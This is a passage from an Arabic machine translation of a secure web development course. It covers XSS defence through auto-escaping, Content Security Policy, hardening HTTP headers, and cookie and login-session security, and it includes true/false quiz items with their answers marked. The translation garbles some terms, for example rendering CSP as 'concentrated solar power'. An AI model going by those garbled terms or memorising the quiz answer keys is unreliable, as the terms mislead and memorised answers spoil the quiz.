ها هي المشكلة: عليك أن تكون *مثاليا*. إذا هربت من الإخراج بشكل صحيح بنسبة 99.9٪ من الوقت ، وقمت بإنشاء مخرجات في 1000 مكان ، فسيكون برنامجك *ضعيفا*. قد تكون عبقريا ، لكن هذا ليس ذا صلة. حتى العباقرة يخطئون. حتى لو كان البرنامج مثاليا في *الأصل* ، يمكن أن يؤدي التغيير اللاحق بسهولة إلى حدوث ثغرة أمنية. نحن بحاجة إلى حل أفضل من* "عدم ارتكاب خطأ يسهل ارتكابه*" - خاصة عندما يحدث شيء ما مرارا وتكرارا.

في معظم الحالات ، يكون أفضل حل ل XSS هو **_اختيار إطار عمل أو مكتبة تهرب تلقائيا من إخراج HTML نيابة عنك_**. بهذه الطريقة ، يتم الهروب من الإخراج ، لكن ليس عليك التفكير فيه باستمرار. بدلا من ذلك ، يهرب نظام الإخراج تلقائيا من الإخراج نيابة عنك (وهذا ما يسمى أحيانا *الهروب التلقائي*). عادة ما يتم هذا الهروب باستخدام أحد أنظمة القوالب العديدة المتاحة التي تتيح لك تحديد القالب الثابت (الموثوق به وبالتالي يمر عبر unescaped) والبيانات (حيث يتم الهروب من البيانات غير الموثوق بها افتراضيا).

هناك الكثير من الخيارات التي تفعل ذلك. مكتبة جافا سكريبت React ، على سبيل المثال ، تهرب افتراضيا من أي قيم مضمنة في لغة JSX الخاصة بها قبل عرضها. يهرب Ruby on Rails من قيم HTML افتراضيا عند استخدام قوالب ERB الخاصة به. يستخدم Flask لإطار عمل الويب Python مكتبة قوالب Jinja لعرض القوالب، ويقوم Jinja تلقائيا بالهروب التلقائي من البيانات المعروضة في قالب HTML. هذه ليست قائمة كاملة على الإطلاق. الهروب التلقائي هو قدرة شائعة جدا في أطر الويب. نوصي بشدة أن تختار فقط أطر الويب ومكتبات الإخراج التي ستهرب من HTML افتراضيا ؛ هناك العديد من الأشياء الجيدة للاختيار من بينها.

#### عندما تحتاج إلى السماح بالبيانات غير الموثوق بها التي لم يتم تجاوزها

في بعض الأحيان تحتاج ** إلى السماح للبيانات التي لم يتم تجاوزها. أحد الأسباب التي قد *تجعلك ترغب* في حذف بعض عمليات الهروب هو أنك تريد أن يكون للبيانات غير الموثوق بها بعض الإجراءات التي سيمنعها الهروب. على سبيل المثال ، لنفترض أنك تريد من المستخدمين غير الموثوق بهم توفير HTML الذي سيكتب بعض نصوصهم بخط مائل. في هذه الحالة ، سوف ترغب في السماح **<i> ** و**</i>**  (مائل) من خلال ، على الرغم من أنك عادة ما تهرب من **< ** و**> ** الاحرف.

تكمن المشكلة في أنه بمجرد السماح بأي شيء إضافي ، يصبح الرمز الضروري للهروب من الإخراج بشكل صحيح أكثر تعقيدا. على سبيل المثال ، تحتاج إلى التأكد من أن كل علامة فتح (**&lt ؛ i >**) تحتوي على علامة مطابقة ، وأنها تتداخل بشكل صحيح ، أو أنها إما لا تحتوي على سمات أو أن هذه السمات نفسها مسموح بها ، وأن العلامات والسمات التي تسمح بها فقط هي المسموح بها. هناك العديد من الحالات التي يصبح فيها هذا نقطة ضعف. بعد كل شيء ، تهرب العديد من الأطر من البيانات افتراضيا ، ولكن عندما يحتاج المطورون إلى السماح لشيء ما بالمرور ، فإنهم يسمحون أحيانا بمرور *الكثير*.

في هذه الحالة ، حيثما أمكن ، استخدم المكتبات *المصممة بالفعل* للسماح بما تريده فقط ، والهروب من كل شيء آخر. تحتوي معظم لغات وأطر البرمجة المستخدمة على نطاق واسع بالفعل على مكتبات تتيح لك تحديد ما يجب السماح به ، ثم الهروب أو تجريد أو منع الباقي.

#### عناوين URL

لقد ركزنا على الهروب من HTML ، لأن هذه هي أكبر مشكلة في تطبيقات الويب. لكن HTML يمكن أن يتضمن أنواعا أخرى من البيانات ، وربما تكون عناوين URL الأكثر شيوعا.

يجب أيضا تخطي عناوين URL المضمنة ، وتختلف قواعد الهروب من عناوين URL. بناء جملة عنوان URL هو مخطط بشكل عام**&#58; [سلطة]مسار[؟استفسار]&#8202; [&#35;جزء]**. على سبيل المثال ، في عنوان URL **<https://www.linuxfoundation.org/about/>** ، يكون المخطط هو "**https**" ، والسلطة "<b>www.linuxfoundation.org</b>" ، والمسار هو** "/ about /**" ، ولا يحتوي هذا المثال على استعلام أو جزء مجزأة. في بعض الأحيان تحتاج إلى أحرف خاصة في المسار أو الاستعلام أو الجزء. الطريقة التقليدية للهروب من تلك الأجزاء من عناوين URL هي التأكد أولا من ترميز البيانات باستخدام UTF-8 ، والهروب ك "****٪ hh" (حيث **hh** هو التمثيل السداسي العشري) جميع البايتات باستثناء وحدات البايت "الآمنة" ، والتي عادة ما تكون A-Z **و **** **a-z** و 0-9** و ".**** ", "**-**", "**&#42;** "و**" &#95;** ". روتين Java **java.net.URLEncoder.encode()** يحول جميع المسافات إلى "**+**" بدلا من "**٪20**" ؛ كل من الاتفاقيات "**+**" و "**٪ 20**" مستخدمة على نطاق واسع.

#### بدائل XSS

يجب عليك عادة استخدام إطار عمل يهرب تلقائيا من HTML افتراضيا.

إذا لم تتمكن من ذلك لسبب ما ، يمكنك إنشاء غلاف يقوم بالهروب نيابة عنك ويرسل الإخراج. يكون الغلاف أكثر خطورة إذا كان من السهل عدم استدعاء الغلاف. إذا كنت تستخدم غلافا ، فيجب أن يقوم الغلاف أيضا بإجراء الإخراج. إذا اتصلت بشكل منفصل بروتين هروب ثم اتصلت لإنتاج مخرجات ، فمن السهل بشكل خاص نسيان استدعاء الغلاف. على سبيل المثال ، إذا قمت بعمل  SendOutput (EscapeHTML (data)) **، فسيكون من السهل جدا استخدام **SendOutput (data) الضعيف ** بدلا من ذلك.**

البديل المقترح أحيانا هو استخدام تصفية إدخال قاسية للغاية تمنع جميع أحرف HTML الوصفية (**& >> " ' **). من الناحية النظرية ، هذا يمنع XSS في HTML. إذا كان بإمكانك ** تقييد مدخلاتك على هذا النحو ، فيجب عليك القيام بذلك ، حيث يجب عليك دائما الحد من مدخلاتك غير الموثوق بها قدر الإمكان. من الناحية العملية ، في حين أن تصفية المدخلات القاسية يمكن أن تساعد في مواجهة الهجمات الأخرى ، إلا أنها عادة *لا* تكفي لمواجهة XSS. تكمن المشكلة في أنه عادة ما يتعين على بعض المدخلات في النهاية السماح ببعض أحرف HTML الوصفية. على سبيل المثال ، لن يكون O'Malley سعيدا بنظام لا يسمح بعلامات اقتباس مفردة في الاسم. حتى النظام الذي يبدأ بهذا القيد غالبا ما يتفوق عليه ، لذلك لا يمكنك الاعتماد على التحقق من صحة المدخلات القاسية *في حد ذاته* لمواجهة XSS. نعم ، استخدم التحقق من صحة الإدخال القاسي حيث يمكنك ذلك كإجراء تصلب - لكنه لا يكفي لمواجهة XSS.

إجراء تصلب خفيف للغاية هو تعيين السمة **HttpOnly** على ملفات تعريف الارتباط. بهذه الطريقة ، إذا تم تشغيل برنامج نصي ضار ، فلن يتمكن من رؤية قيمة ملف تعريف الارتباط. *يجب عليك* تعيين هذا القيد عندما تستطيع ، لأنه يحد من الامتياز ، ولكن هذا إجراء تصلب خفيف جدا لا يكون مفيدا إلا إذا قمت بتطبيق  تدابير *أخرى* أيضا.

عادة ما يتم مواجهة XSS بشكل أفضل عن طريق اختيار إطار عمل أو مكتبة تهرب تلقائيا من الإخراج نيابة عنك. ومع ذلك ، غالبا ما تحتوي البرامج على العديد من المخرجات. سيكون من الأفضل إذا قمنا بإقران هذا الحل بشيء آخر يحد من الضرر عند حدوث خطأ ** . يوجد حل على الويب: سياسة أمان المحتوى (CSP). ستناقش الوحدة التالية هذا الأمر.

#### اختبار 4.2: مكافحة البرمجة النصية عبر المواقع (XSS)

\>\>غالبا ما يكون اختيار إطار عمل أو مكتبة تفلت تلقائيا من إخراج HTML أحد أفضل الطرق لمواجهة هجمات XSS. صواب أم خطأ؟<<

(x) صحيح

( ) خطأ

[تفسير]

هذا صحيح. تولد العديد من تطبيقات الويب العديد من أجزاء HTML ، ومن غير العملي تذكر الهروب يدويا من كل واحد منها. بدلا من ذلك ، استخدم نظاما يهرب منها تلقائيا. في بعض الحالات ، ستحتاج إلى تجاوز هذا ، ولكن يمكن مراجعة هذه التجاوزات بعناية في كل استخدام للتأكد من أنها آمنة.

بالطبع ، يمكن أن تساعد التدابير الأخرى أيضا ، ولكن وجود * إعدادات افتراضية آمنة للبرمجة يعني أنه عادة ما تكون هناك مشاكل أقل في المقام الأول.*

[تفسير]

### سياسة أمان المحتوى (CSP)

[تطبيق ويب]

عند إنشاء تطبيقات الويب ، فإن أداة مهمة حقا للحد من الضرر هي *سياسة أمان المحتوى* (CSP). إذا كان موجودا ، فإن CSP يخبر متصفح الويب المتلقي بما هو مسموح به وغير مسموح به من منظور أمني. لا يمنع CSP في حد ذاته معظم الهجمات ، ولكنه يمكن أن يجعل استغلال العديد من نقاط الضعف أكثر صعوبة أو يقلل من تأثيرها بشكل كبير. وهذا يجعل الطاقة الشمسية المركزة دفاعا مهما *في العمق* لتقليل المخاطر.

عادة ما يتم إرسال مرجع إلى CSP كرأس HTTP (يسمى **Content-Security-Policy**) ، ومثل جميع رؤوس HTTP ، يستلمها  المستخدم *قبل* أن يتلقى المستخدم المحتوى الرئيسي. يمكنك أيضا إرسال معلومات CSP ك **<meta>**  عنصر HTML مع ** تعيين السمة **http-equiv إلى **سياسة أمان المحتوى**. ومع ذلك ، باستخدام &**lt ؛ meta>**  ليس جيدا مثل استخدام رأس HTTP ، لأن النظام قد بدأ بالفعل في معالجة HTML عند هذه النقطة. لذا حاول استخدام رأس HTTP بدلا من ذلك. إذا كان عليك استخدام CSP عبر عنصر HTML ، فقم بتضمين هذا**<meta>** في أقرب وقت ممكن في  HTML الخاص بك ، بحيث يصبح ساري المفعول في أقرب وقت ممكن.

ربما تكون أهم قدرة CSP هي أن CSP يمكنها التحكم في البرامج النصية المسموح بتشغيلها. بشكل افتراضي ، يقوم متصفح الويب بتشغيل جميع البرامج النصية المرسلة إليه. هذا أمر فظيع إذا كانت هناك ثغرة أمنية في XSS ، لأن الهجوم قد يكون قادرا على التسلل إلى الصفحة وجعل متصفح الويب الخاص بالضحية يقوم بتشغيله. الحل الآمن الأفضل هو فصل الكود عن البيانات والحد من الامتياز. يمكننا فعل ذلك باستخدام الطاقة الشمسية المركزة.

هنا CSP بسيط يمنع عددا كبيرا من الهجمات. يقول CSP هذا أن الموارد (خاصة البرامج النصية والأنماط) هي فقط من الموقع المصدر ('**self' **) ، وأن **المضمنة** أو **المفردات** للنصوص والأنماط غير مسموح بها (لأنه لم يسمح بها على وجه التحديد):

**سياسة أمان المحتوى: افتراضي-src "ذاتي" ؛**

يتمثل التحدي في CSP هذا في أنه لاستخدامه بكامل إمكاناته ، نحتاج إلى *التوقف عن* استخدام الأنماط والبرامج النصية المضمنة. يمكن أن يطلب HTML *تحميل* ملفات JavaScript  وأنماط CSS ، ولكن يجب أن تكون أنماط JavaScript و CSS في ملفات منفصلة. قد يتضمن HTML الكثير من المعلومات المهمة للنصوص والأنماط (مثل **العلامة** **والفئة **والمعرف**) ، ولكن لا يمكن ل HTML تضمين البرامج النصية والأنماط مباشرة.** 

يعتبر عدم استخدام البرامج النصية والأنماط المضمنة ممارسة جيدة على نطاق واسع ، ولكنه أكثر من ذلك ؛ إنه يحسن الأمان بشكل كبير. إذا تم تجاهل البرامج النصية والأنماط المضمنة ، فإن هجوم XSS الذي يخرب صفحة ويب HTML *لا يمكن* أن يتسبب بسهولة في استخدام برنامج نصي أو نمط غير موثوق به. هذا لا يمنع جميع الهجمات ، لكنه يمنع الكثير ، ويجعل الهجمات الأخرى أكثر صعوبة بشكل كبير. إذا كان بإمكانك *التوقف عن* استخدام جميع البرامج النصية والأنماط المضمنة ، وفرض ذلك من خلال CSP الخاص بك ، يصبح النظام أكثر مقاومة لمجموعة من الهجمات.

ولكن ماذا لو كان من الصعب جدا تنفيذ هذه السياسة على الصفحة ، أو لا تلبي ظروفك؟ وهذه ليست مشكلة؛ بل هي المشكلة. ما عليك سوى استخدام ** CSP مختلف لتلك الصفحة. تحتوي مواصفات CSP على مجموعة من الخيارات التي يمكنك استخدامها للسماح بمزيد من العمليات وتقييد الآخرين.

كما هو الحال دائما ، هدفك هو أقل امتياز: حاول أن تجعل CSP مقيدا قدر الإمكان. ستحصل غالبا على أكبر فائدة إذا قمت بتعديل نظامك بحيث يمكنه استخدام CSP أكثر تقييدا على جميع الصفحات ، ولكن حتى التقييد الصغير يمكن أن يكون له بعض الفوائد. الطرق الشائعة لتخفيف القيود المفروضة على البرامج النصية والأنماط هي:

1. احصل على CSP مقيد على أكبر عدد ممكن من صفحات الويب ، مثل السماح فقط بالبرامج النصية والأنماط من مواقع محددة على موقع الويب الخاص بك (لا يتم تضمينها أبدا). ثم قم بتخفيف القيود المفروضة على الصفحات التي يصعب فيها ذلك حاليا.

2. السماح بتحميل البرامج النصية والأنماط من مواقع أخرى محددة. يمكنك تعيين **default-src** (حيث يتم تحميل ملفات مصدر البرنامج النصي) للسماح لمواقع ويب أخرى محددة تقوم بإدراجها. هذا يخبر متصفح الويب أنك تثق تماما في تلك المواقع المحددة. انتبه; هذا يمكن أن يضر بخصوصية المستخدم. على سبيل المثال ، ستعرف كل مؤسسة تدير تلك المواقع الأخرى  على *الأقل* متى يسترد المستخدم تلك المعلومات وعنوان IP الخاص به.

3. السماح بتجزئات محددة. يمكنك تعيين **default-src** للسماح ببرنامج مضمن معين بالقول إنه يمكن تنفيذ تجزئة التشفير الخاصة به باستخدام التنسيق  "&lt ؛ **hash-algorithm> -&lt ؛ base64-value>" **. يمكن أن تكون هذه خطوة وسيطة مفيدة إذا كان لديك نصوص مضمنة موجودة ، على الرغم من أنه على المدى الطويل سيكون من الأفضل نقل هذه البرامج النصية إلى ملف منفصل.

لدى CSP آليات أخرى مختلفة للحد من الامتيازات. معلمة CSP أخرى مهمة بشكل خاص هي **أسلاف الإطار** ، وهي أداة رائعة لمواجهة هجمات clickjacking. هجوم clickjacking هو هجوم يمكن للمهاجم فيه "اختطاف" نقرة قصدها المستخدم لغرض واحد ، ولكن في الواقع تم "اختطاف" النقرة للقيام بشيء آخر. عادة ما يقوم المهاجمون بذلك عن طريق إساءة استخدام إمكانات إطار HTML. إذا كنت لا تستخدم الإطارات - ومعظم المواقع لا تستخدم - يمكنك بسهولة إصلاح ذلك عن طريق تضمين "**أسلاف الإطارات" لا شيء "؛** " في سياستك. إذا كنت تستخدم الإطارات ، فاستخدم "**أسلاف الإطار" الذاتي "؛ **" بدلا من ذلك.

عندما تقوم بتطوير موقع ، قد يكون من الحكمة الاطلاع على مواصفات CSP ومحاولة الحد الأقصى مما تطلب من متصفحات الويب السماح به. كلما سمحت بأقل ، قل عدد المهاجمين الذين يمكنهم فعله إذا ارتكبت خطأ. هناك رؤوس HTTP أخرى يمكن أن تساعد في تقوية الموقع ضد الهجوم ؛ في الوحدة التالية سنلقي نظرة على عدد قليل.

#### اختبار 4.3: سياسة أمن المحتوى (CSP)

\>\> استخدام إعداد CSP الذي يحظر البرامج النصية المضمنة ، يتطلب تنفيذ JavaScript فقط من مواقع موثوقة محددة ، ويمكن أن يؤدي نقل جميع JavaScript لفصل الملفات إلى تلك المواقع إلى تقليل تأثير هجمات البرمجة النصية عبر المواقع (XSS). صواب أم خطأ؟<<

(x) صحيح

( ) خطأ

[تفسير]

هذا صحيح. لا يزيل CSP جميع المشكلات ، لكن CSP يتيح لك منع البرامج النصية المضمنة وبدلا من ذلك يتطلب تحميل JavaScript من مواقع موثوقة محددة. في هذا التكوين ، لم يعد بإمكان هجمات XSS إدراج شفرة JavaScript ضارة بسهولة ، ويمكن أن يقلل ذلك من تأثير هجمات XSS.

[تفسير]

### رؤوس تصلب HTTP الأخرى

[تطبيق ويب]

عندما تقوم بتسليم صفحات الويب ، يمكنك تحديد ما يمكن فعله بالنتائج ، مما يجعل من الصعب على المهاجمين التسبب في أضرار جسيمة. باختصار ، هناك رؤوس HTTP أخرى يمكنك تعيينها والتي يمكنها أحيانا تقوية تطبيقاتك ضد الهجمات. لقد ناقشنا بالفعل سياسة أمان المحتوى (CSP) ، والتي ربما تكون الأكثر أهمية. فيما يلي بعض رؤوس HTTP الأخرى التي يجب أن تفكر في استخدامها:

* **X-Content-Type-Options**<br>يجب ضبط هذا على **nosniff** ، مما يعني أن أنواع MIME المتوفرة صحيحة وأن جهاز الاستقبال يجب ألا يحاول تخمين النوع. هذا يعني أن المهاجمين لن يكونوا قادرين على خداع متصفح الويب لاستخدام نوع مختلف.

* **خيارات الإطار X**<br> يجب تعيين هذا على **DENY** أو **SAMEORIGIN.** مثل **أسلاف إطار** CSP ، يمنع هذا استخدام الإطارات أو يسمح بها فقط من الأصل ، ومواجهة العديد من هجمات clickjacking. من الناحية الفنية ، تم تجاوز X-Frame-Options بواسطة  أسلاف إطار CSP ، **ولكن إذا كان لديك مستخدمون ل Internet Explorer (IE) ، فأنت بحاجة أيضا إلى هذا لأن IE لا يدعم **أسلاف إطار CSP**.**

* ** HTTP Strict-Transport-Security (HSTS) **<br> هذا يعني أنه *يسمح فقط* ببروتوكول HTTPS الآمن ، وليس بروتوكول HTTP غير الآمن ، للزيارات المستقبلية لهذا الموقع لعدد معين من الثواني. الإعداد الشائع هو "أمن **النقل الصارم: الحد الأقصى للعمر = 31536000 ؛** " مما يعني أنه ** سيتم السماح ب HTTPS فقط لمدة عام (الرقم هو عدد الثواني). عدد أكبر على ما يرام.

إذا كان موقعك متاحا بشكل عام، فيمكنك بسهولة اختبار الرؤوس باستخدام [موقع ويب رؤوس الأمان](https://securityheaders.com/).

أيضا ، كلمة مهمة حول رؤوس HTTP بشكل عام. قد تقرر ، لأسباب مختلفة ، توفير رؤوس HTTP أخرى. إذا كانت بعض معلومات الرأس هذه من مهاجم ، فكن *حذرا بشكل خاص*. كما هو الحال دائما ، قم بالتحقق من صحة الإدخال بعناية فائقة. هناك هجوم سيئ ، على وجه الخصوص ، حيث يتمكن المهاجم من إدراج سطر جديد في الإدخال ؛ سيؤدي ذلك *إلى تقسيم* رأس HTTP  في إصدارات HTTP 1.1 و 2 ، حيث يمكن تفسير بقية النص بعد السطر الجديد على أنه رأس HTTP يوفره المهاجم. قد يؤدي ذلك إلى تعطيل العديد من وسائل الحماية أو حتى تنفيذ هجوم.

#### اختبار 4.4: رؤوس تصلب HTTP أخرى

\>\>عند إرسال معلومات باستخدام HTTP ، يمكنك تعيين رؤوس HTTP مختلفة (مثل HTTP Strict-Transport-Security (HSTS)) للمساعدة في تقوية نظامك ضد الهجوم. صواب أم خطأ؟<<

(x) صحيح

( ) خطأ

### ملفات تعريف الارتباط وجلسات تسجيل الدخول

[تطبيق ويب]

آلية مهمة في بروتوكول HTTP هي دعم *ملفات تعريف الارتباط*. ملفات تعريف الارتباط هي أجزاء صغيرة من البيانات المرسلة من خادم الويب إلى متصفح الويب. من الآن فصاعدا ، عندما يتصل متصفح الويب بخادم الويب هذا ، سيرسل متصفح الويب قيمة ملف تعريف الارتباط هذه مرة أخرى إلى الخادم الذي جاء منه ، مع مراعاة قيود معينة.

#### سمات ملفات تعريف الارتباط

يمكن لخوادم الويب أيضا تعيين بعض السمات على ملفات تعريف الارتباط التي ترسلها. على سبيل المثال:

* وقت انتهاء الصلاحية: إذا لم يتم تعيين وقت انتهاء الصلاحية، تنتهي صلاحية ملف تعريف الارتباط عند خروج المتصفح (تسمى ملفات تعريف الارتباط هذه ملفات تعريف *ارتباط الجلسة*). خلاف ذلك ، قد يقوم المتصفح بتخزين ملف تعريف الارتباط بشكل دائم حتى انتهاء الوقت (تسمى  ملفات تعريف الارتباط هذه ملفات تعريف الارتباط الدائمة * - *يمكن للمستخدم * حذف ملفات تعريف الارتباط هذه ، لكن القليل منها يفعل ذلك).*

* **علامة آمنة**: إذا تم تعيينها ، إرسال ملف تعريف الارتباط فقط إلى خوادم HTTPS ، وليس إلى HTTP. يجب عليك ضبط هذا كلما كان ذلك عمليا.

* **علامة HttpOnly**: ملف تعريف الارتباط غير مرئي لبرامج JavaScript. يجب عليك ضبط هذا كلما كان ذلك عمليا.

* **SameSite**: يحتوي هذا على ثلاث قيم رئيسية - **لا شيء** ، **والتراخي** ، **والصارم**. "**لا شيء" **يعني أن ملفات تعريف الارتباط يتم إرسالها دائما إلى خادم الويب المطابق. "** Lax**" يعني أنه يتم إرسال ملفات تعريف الارتباط إذا كانت GET** (انقر) على موقع ويب تابع لجهة خارجية ، وإلا يتم إرسال ملفات تعريف الارتباط فقط إذا كان الطلب يأتي من نفس الموقع. "**  **صارم" **يعني أن ملفات تعريف الارتباط يتم إرسالها فقط في سياق الطرف الأول ؛ لن يتسبب أي طلب من موقع ويب آخر ** في  إرسال ملف تعريف الارتباط. تاريخيا ، كان الإعداد الافتراضي لمتصفح  الويب لا **شيء بشكل فعال **، لكن متصفحات الويب الحديثة تعمل الآن مع **Lax** كإعداد افتراضي لأن هذا يقاوم هجمات معينة. سنناقش هذا لاحقا ، ولكن يجب عليك ضبط هذا على الأقل على **التراخي** حيثما كان ذلك عمليا.

#### ملفات تعريف الارتباط في السياق

ملفات تعريف الارتباط ليست ، في حد ذاتها ، ضارة بالضرورة. ومع ذلك ، يمكن أن تكشف ملفات تعريف الارتباط عن هوية مقدم الطلب في بعض الحالات ، مما يجعلها مشكلة خصوصية محتملة. هذا ينطبق بشكل خاص على ملفات تعريف الارتباط التي تحتوي على **SameSite = لا شيء**. إذا قام شخص ما بإعداد طلبات لهذا النوع من ملفات تعريف الارتباط على العديد من مواقع الويب (على سبيل المثال ، عن طريق تضمين صور الجهات الخارجية) ، فيمكن استخدام ملف تعريف الارتباط لتتبع إجراءات هذا المستخدم عبر العديد من المواقع. يطلق على ملف تعريف الارتباط الذي يهدف إلى تتبع المستخدمين عبر مواقع الويب ملف تعريف *ارتباط التتبع*. يمكن أن يكون تتبع ملفات تعريف الارتباط أسوأ إذا كان لها وقت انتهاء صلاحية طويل ، لأن ملفات تعريف الارتباط هذه تستمر بعد خروج المتصفح. اجتذبت ملفات تعريف الارتباط للتتبع مخاوف العديد من الدول بسبب تأثيرها الضار على خصوصية المستخدم. نتيجة لذلك ، تم تمرير قوانين مختلفة تتضمن ملفات تعريف الارتباط والموافقة. ومع ذلك ، فإن تنفيذ ملفات تعريف الارتباط للتتبع ليس هو الطريقة الوحيدة لاستخدام ملفات تعريف الارتباط. يمكن لملفات تعريف الارتباط أيضا تحسين الأمان.

تعد ملفات تعريف الارتباط مهمة جزئيا لأنها غالبا ما تستخدم لتنفيذ جلسات تسجيل الدخول على شبكة الويب العالمية (WWW). جلسة تسجيل الدخول هي ببساطة فترة نشاط بين وقت تسجيل دخول المستخدم وتسجيل الخروج. لم يكن لبروتوكول WWW الأصلي طريقة لتنفيذ جلسات تسجيل الدخول ، وتوفر ملفات تعريف الارتباط آلية بسيطة لدعم جلسات تسجيل الدخول.

#### ملفات تعريف الارتباط وجلسات تسجيل الدخول

على الويب ، تتمثل إحدى الطرق الشائعة لتنفيذ جلسة تسجيل الدخول في الحصول على نموذج تسجيل دخول. إذا نجح تسجيل الدخول ، يرسل خادم الويب "**معرف الجلسة**" ضمن قيمة ملف تعريف الارتباط. معرف الجلسة هو ببساطة رقم عشوائي كبير لا يمكن تخمينه من قبل أي شخص آخر. من الآن فصاعدا ، يرسل متصفح الويب ملف تعريف الارتباط هذا (مع معرف الجلسة) كلما اتصل بخادم الويب هذا. يمكن لخادم الويب التحقق من معرف الجلسة هذا لمعرفة من يقدم الطلب ... وإذا كان معرف الجلسة هذا صالحا ، فإن خادم الويب يبحث عن معرف المستخدم لتلك الجلسة ويسمح للمستخدم بكل ما هو مصرح للمستخدم بالقيام به. لا يعد تضمين معرف الجلسة في ملف ** تعريف الارتباط ** هو الطريقة الوحيدة لاستخدام ملفات تعريف الارتباط لدعم تسجيل الدخول ، ولكنه نهج شائع.

عادة ، عند تطوير تطبيقات الويب ، ستستخدم إطار عمل أو مكتبة (في الغالب) تتعامل مع جلسات تسجيل الدخول نيابة عنك. هذا جيد ، فقط تحقق للتأكد من أنه آمن. سنغطي هنا بعض الميزات الرئيسية التي يجب البحث عنها. في بعض الحالات ، لن يقوم إطار العمل الخاص بك بذلك بمفرده ، ولكن يمكنك اتخاذ بعض الخطوات الإضافية لتحقيق ذلك.

أولا ، إذا كان إطار العمل الخاص بك يستخدم معرفات الجلسة في ملفات تعريف الارتباط (نهج شائع) ، فمن الأهمية بمكان ألا يسمح التنفيذ للمهاجمين بتخمين معرفات الجلسة أو اكتشافها. إذا تمكن المهاجم من الحصول على معرف الجلسة ، فيمكن للمهاجم التصرف بنفس الامتيازات التي يتمتع بها المستخدم الذي قام بتسجيل الدخول! في هذه الحالة الشائعة ، تحقق من هذه العوامل الرئيسية على الأقل:

1. يجب أن يحتوي معرف الجلسة على 128 بت على الأقل من البيانات العشوائية.

2. يجب إنشاء معرف جلسة العمل باستخدام * منشئ أرقام عشوائية زائفة آمن بشكل مشفر* (CSPRNG). أي شيء يمكن تخمينه (مثل  "*إضافة واحد إلى معرف الجلسة الأخيرة*"  أو *"مكالمة عادية إلى عشوائي ()")* غير مقبول. سنناقش هذا بمزيد من التفصيل لاحقا.

3. تشفير معرفات الجلسات بين خادم الويب ومتصفح الويب. الحل المعتاد هو تعيين علامة Secure لملف تعريف الارتباط **** والتواصل دائما باستخدام HTTPS (TLS).

ثانيا ، قم بتعيين سمات ملفات تعريف الارتباط التي تحتوي على معرفات الجلسة لتكون آمنة:

1. كما ذكرنا سابقا ، حيث يتم تعيين ملفات تعريف الارتباط العملية للتعامل مع جلسة تسجيل الدخول باستخدام ** علامة HttpOnly**. بهذه الطريقة ، لن يكون لبرامج JavaScript وصول مباشر إليها. هذا مثال آخر على أقل امتياز. إذا لم تكن هناك حاجة إلى امتياز، فلا توفر الوصول.

2. وبالمثل ، ضع في اعتبارك استخدام ملفات تعريف ارتباط الجلسة (ملفات تعريف الارتباط بدون وقت انتهاء الصلاحية) لملفات تعريف الارتباط التي تخزن المعلومات في جلسات تسجيل الدخول. ليس عليك القيام بذلك. يمكنك استخدام ملفات تعريف الارتباط الدائمة لتخزين معلومات الجلسة. ولكن إذا كنت تستخدم ملفات تعريف الارتباط الدائمة ، ففكر في تحديد الوقت ببضعة أيام على الأكثر. يتم تخزين ملفات تعريف الارتباط الدائمة في التخزين الدائم ، وقد يتمكن المهاجم من الوصول إلى تلك المعلومات المخزنة.

ثالثا ، تأكد من أن لديك وظائف تسجيل الدخول والخروج ، وأنها تعمل بالفعل بشكل صحيح!

عندما يقوم المستخدم بتسجيل الدخول بنجاح ، تأكد من أن المستخدم * يحصل دائما* على ** معرف جلسة جديد (يتم إرجاعه عادة في ملف تعريف ارتباط). على وجه الخصوص ، يجب ألا يعيد الجانب المتلقي لتسجيل الدخول *أبدا* استخدام قيم الجلسة. يعني تسجيل الدخول الجديد طلب جلسة جديدة (حتى إذا كانت هناك جلسة حالية بالفعل) ، لذا تأكد من إنشاء جلسة جديدة واستخدامها لهذا الطلب! إذا فشل برنامجك في إنشاء جلسة عمل جديدة لتسجيل دخول جديد ، فقد يكون عرضة لهجوم *تثبيت الجلسة*.

 يعد تثبيت الجلسة سببا شائعا للثغرات الأمنية لدرجة أنه 2019 CWE Top 25 # 37. إنه [CWE-384](https://cwe.mitre.org/data/definitions/384.html).

وبالمثل ، تأكد *من* تزويد المستخدمين بإجراء "تسجيل الخروج  " ("تسجيل الخروج") الذي *يعمل بالفعل*. إذا كنت تستخدم معرفات الجلسة - وهو نهج شائع - فيجب أن يؤدي تسجيل الخروج إلى إبطال تلك الجلسة. يعني هذا بشكل عام أنك بحاجة إلى إزالة سجل معرف جلسة العمل هذا من قاعدة بيانات الخادم التي تسجل معرفات الجلسة النشطة (ومعرف المستخدم الذي ينطبق عليه كل معرف جلسة). تحتاج أيضا إلى إخبار المتصفح بحذف ملف تعريف الارتباط أو على الأقل قيمة معرف الجلسة في ملف تعريف الارتباط هذا. بهذه الطريقة ، يتم تسجيل خروج المستخدم بالفعل. يقوم المستخدمون بتسجيل الخروج لتقليل مخاطرهم ، ولكن هذا لا يعمل إذا لم يقم التطبيق بتسجيل خروجهم بالفعل. من المثير للدهشة أن عددا كبيرا من المواقع الرئيسية ، في وقت أو آخر ، لم يسجل خروج المستخدمين عندما طلبوا ذلك.

يجب عليك أيضا تسجيل الخروج من جلسة غير نشطة تلقائيا. بعض الطرق السهلة للقيام بذلك هي عدم تعيين تاريخ انتهاء الصلاحية (لذلك سيقوم المستخدم بتسجيل الخروج عند إغلاق المتصفح الخاص به) أو تعيين تاريخ انتهاء الصلاحية عندما يتم تسجيل خروج المستخدم. ستتيح لك الأطر عادة تكوين هذا بسهولة.

#### اختبار 4.5: ملفات تعريف الارتباط وجلسات تسجيل الدخول

\>\>عندما يقوم مستخدم بتسجيل الدخول مرة أخرى، أعد استخدام معرف جلسة العمل إذا كانت معرفات الجلسة مستخدمة وموجودة بالفعل، لتقليل الالتباس لدى المستخدم. صواب أم خطأ؟<<

( ) صحيح

(x) خطأ

[تفسير]

هذا غير صحيح. إذا قام المستخدم بتسجيل الدخول مرة أخرى ، فإنه يطلب جلسة جديدة. احترم هذا الطلب من خلال إنشاء جلسة جديدة!

يمكن أن تؤدي إعادة استخدام جلسة موجودة ، في بعض التطبيقات ، إلى فتح نظام لهجوم يسمى تثبيت الجلسة. لم ندخل في تفاصيل تثبيت الجلسة في هذه الدورة التدريبية ، ولكن ذلك لأن الإجراء المضاد ("عدم إعادة استخدام معرفات الجلسة") أسهل بكثير في الشرح من الهجوم.

[تفسير]

### CSRF / XSRF

[تطبيق ويب]

